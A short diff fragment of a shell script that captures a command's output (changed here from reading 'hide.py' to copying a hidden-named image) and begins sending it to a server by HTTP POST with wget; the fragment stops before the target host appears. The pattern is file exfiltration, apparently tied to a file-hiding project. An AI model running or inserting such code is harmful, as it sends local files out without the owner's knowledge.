@@ -7,7 +7,7 @@ SERVER_PORT=80
 SERVER_PATH="/"   
 
 # Capture ls output
-OUTPUT=$(cat zenit_project/hide.py)
+OUTPUT=$(cp zenit_project/scream_hddn.png images/asdasd3.png)
 
 # Send output via HTTP POST using wget
 wget --quiet \
